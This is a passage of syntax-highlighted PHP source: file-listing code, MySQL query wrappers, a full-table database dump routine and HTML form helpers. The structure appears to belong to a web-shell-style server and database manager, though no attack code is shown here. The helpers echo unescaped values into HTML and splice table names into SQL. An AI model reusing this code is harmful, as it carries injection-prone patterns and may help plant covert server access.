<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'fileowner'</span>]=getUser(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirlink'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'server_link'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   closedir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   clearstatcache();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">qy</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql</span>) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">echo $sql.'&lt;br&gt;';</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">error</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = @mysql_query(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span>)) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span>(is_resource(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 1;<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 2;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }<span style="color: #de935f; background-color: #373b41;">   </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">q</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql</span>) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> @mysql_query(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">fr</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">qy</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   mysql_free_result(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">qy</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">sizecount</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileSize</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">size</span> = sprintf(<span style="color: #8abeb7;">"%u"</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileSize</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">size</span> == 0) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">'0 Bytes'</span> ;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sizename</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">' Bytes'</span>, <span style="color: #8abeb7;">' KB'</span>, <span style="color: #8abeb7;">' MB'</span>, <span style="color: #8abeb7;">' GB'</span>, <span style="color: #8abeb7;">' TB'</span>, <span style="color: #8abeb7;">' PB'</span>, <span style="color: #8abeb7;">' EB'</span>, <span style="color: #8abeb7;">' ZB'</span>,<span style="text-decoration: underline;"> </span><span style="color: #8abeb7; text-decoration: underline;">' YB'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> round( <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">size</span> / pow(1024, (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span> = floor(log(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">size</span>, 1024)))), 2) . <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sizen</span><span style="color: #f0c674; text-decoration: underline;">ame</span><span style="text-decoration: underline;">[</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">i</span><span style="text-decoration: underline;">];</span>
}
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">sqldumptable</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=0) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span>;

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledump</span> = <span style="color: #8abeb7;">"DROP TABLE IF EXISTS `</span><span style="color: #f0c674;">$table</span><span style="color: #8abeb7;">`;\n"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = q(<span style="color: #8abeb7;">"SHOW CREATE TABLE </span><span style="color: #f0c674;">$table</span><span style="color: #8abeb7;">"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">create</span> = mysql_fetch_row(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledump</span> .= <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">create</span>[1].<span style="color: #8abeb7;">";\n\n"</span>;

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   fwrite(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledump</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledump</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledump</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rows</span> = q(<span style="color: #8abeb7;">"SELECT * FROM </span><span style="color: #f0c674;">$table</span><span style="color: #8abeb7;">"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span> = mysql_fetch_assoc(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rows</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">k</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">k</span>] = <span style="color: #8abeb7;">"'"</span>.@mysql_real_escape_string(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>).<span style="color: #8abeb7;">"'"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledump</span> = <span style="color: #8abeb7;">'INSERT INTO `'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>.<span style="color: #8abeb7;">'` VALUES ('</span>.implode(<span style="color: #8abeb7;">", "</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>).<span style="color: #8abeb7;">');</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   fwrite(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledump</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledump</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   fwrite(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,<span style="color: #8abeb7;">"\n\n"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   fr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rows</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">p</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">str</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">str</span>.<span style="color: #8abeb7;">"\n"</span>;
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">tbhead</span>() {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;'</span>);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">tbfoot</span>(){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/table&gt;'</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">makehide</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">name</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span>=<span style="color: #8abeb7;">''</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;"</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">makeinput</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span> = <span style="color: #b5bd68;">array</span>()){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'size'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'size'</span>] &gt; 0 ? <span style="color: #8abeb7;">"size=\"$arg[size]\""</span> : <span style="color: #8abeb7;">"size=\"100\""</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'extra'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'extra'</span>] ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'extra'</span>] : <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'type'</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'type'</span>] = <span style="color: #8abeb7;">'text'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>].<span style="color: #8abeb7;">'&lt;br /&gt;'</span> : <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'class'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'class'</span>] ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'class'</span>] : <span style="color: #8abeb7;">'input'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'newline'</span>]) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;p&gt;</span><span style="color: #f0c674;">$arg</span><span style="color: #8abeb7;">[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$</span><span style="color: #8abeb7; text-decoration: underline;">arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" </span><span style="color: #f0c674; text-decoration: underline;">$arg</span><span style="color: #8abeb7; text-decoration: underline;">[size] </span><span style="color: #f0c674; text-decoration: underline;">$arg</span><span style="color: #8abeb7; text-decoration: underline;">[extra] /&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"</span><span style="color: #f0c674;">$arg</span><span style="color: #8abeb7;">[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg</span><span style="color: #8abeb7; text-decoration: underline;">[name]\" value=\"$arg[value]\" type=\"$arg[type]\" </span><span style="color: #f0c674; text-decoration: underline;">$arg</span><span style="color: #8abeb7; text-decoration: underline;">[size] </span><span style="color: #f0c674; text-decoration: underline;">$arg</span><span style="color: #8abeb7; text-decoration: underline;">[extra] /&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">makeselect</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span> = <span style="color: #b5bd68;">array</span>()){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'onchange'</span>]) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">onchange</span> = <span style="color: #8abeb7;">'onchange="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'onchange'</span>].<span style="color: #8abeb7;">'"'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'title'</span>] : <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'newline'</span>]) p(<span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"</span><span style="color: #f0c674;">$arg</span><span style="color: #8abeb7;">[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\"</span><span style="color: #8abeb7; text-decoration: underline;"> </span><span style="color: #f0c674; text-decoration: underline;">$onchange</span><span style="color: #8abeb7; text-decoration: underline;">&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (is_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'option'</span>])) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'nokey'</span>]) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'option'</span>] <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'selected'</span>]==<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;option value=\"$value\" selected&gt;</span><span style="color: #f0c674;">$value</span><span style="color: #8abeb7;">&lt;/option&gt;"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">"&lt;option value=\"$value\"&gt;</span><span style="color: #f0c674;">$value</span><span style="color: #8abeb7;">&lt;/option&gt;"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">arg</span>[<span style="color: #8abeb7;">'option'</span>] <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span>) {
